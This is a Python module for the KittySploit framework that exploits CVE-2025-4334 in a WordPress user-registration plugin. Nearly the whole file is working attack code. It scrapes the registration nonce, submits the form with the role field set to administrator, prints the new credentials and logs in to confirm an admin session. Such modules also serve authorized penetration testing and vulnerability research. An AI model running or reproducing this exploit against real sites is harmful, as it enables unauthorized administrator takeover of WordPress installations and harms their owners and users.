#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Simple User Registration CVE-2025-4334 — register as administrator."""

import re
import secrets

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress


class Module(Auxiliary, Http_client, Wordpress):
    __info__ = {
        "name": "Simple User Registration CVE-2025-4334 admin register",
        "description": (
            "CVE-2025-4334: wpr_submit_form accepts role=administrator in POST fields. "
            "Creates account and attempts wp-login for a WordPress session."
        ),
        "author": ["KittySploit Team"],
        "cve": ["CVE-2025-4334"],
        "references": ["https://github.com/Nxploited/CVE-2025-4334"],
        "tags": [
            "auxiliary", "wordpress", "simple-user-registration", "privesc", "cve-2025-4334"],
        "agent": {
            "risk": "critical",
            "effects": ["active_exploitation", "account_creation"],
            "approval_required": True,
            "produces": ["credentials", "risk_signals"],
        },
    }

    path = OptString("/", "WordPress base path", required=False)
    register_path = OptString("/register/", "Registration page", required=False)

    _NONCE = re.compile(r'name="wpr_nonce" value="([a-f0-9]+)"', re.I)
    _FORM = re.compile(r'name="wpr_form_id" value="([0-9]+)"', re.I)

    def _base(self) -> str:
        return self.wp_normalize_base_path(self.path or "/")

    def _join(self, suffix: str) -> str:
        root = self._base()
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{root}{suffix}" if root != "/" else suffix

    def run(self):
        reg = self._join((self.register_path or "/register/").strip())
        page = self.http_request(method="GET", path=reg, allow_redirects=True)
        if not page or page.status_code != 200:
            print_error("Registration page not found")
            return False
        nonce_m = self._NONCE.search(page.text or "")
        form_m = self._FORM.search(page.text or "")
        if not nonce_m or not form_m:
            print_error("wpr_nonce / wpr_form_id missing")
            return False
        user = f"ks{secrets.token_hex(4)}"
        email = f"{user}@example.test"
        pwd = secrets.token_urlsafe(12)
        post = self.http_request(
            method="POST",
            path=self._join("/wp-admin/admin-ajax.php"),
            headers={
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "X-Requested-With": "XMLHttpRequest",
            },
            data={
                "action": "wpr_submit_form",
                "wpr_form_id": form_m.group(1),
                "wpr_nonce": nonce_m.group(1),
                "_wp_http_referer": reg,
                "wpr[wp_field][user_login]": user,
                "wpr[wp_field][first_name]": "Kitty",
                "wpr[wp_field][last_name]": "Sploit",
                "wpr[wp_field][user_email]": email,
                "wpr[wp_field][password]": pwd,
                "wpr[wp_field][confirm_password]": pwd,
                "wpr[wp_field][role]": "administrator",
            },
            allow_redirects=False,
        )
        if not post or "user_id" not in (post.text or ""):
            print_error("Registration failed")
            return False
        print_success(f"Registered {user}")
        print_status(f"Password: {pwd}")
        login = self.http_request(
            method="POST",
            path=self._join("/wp-login.php"),
            headers={"Content-Type": "application/x-www-form-urlencoded", "Cookie": "wordpress_test_cookie=WP Cookie check"},
            data={"log": user, "pwd": pwd, "wp-submit": "Log In", "testcookie": "1"},
            allow_redirects=False,
        )
        if login and login.status_code == 302 and "wordpress_logged_in" in str(login.headers):
            print_success("WordPress session established")
            return True
        print_warning("Account created; login check failed")
        return True
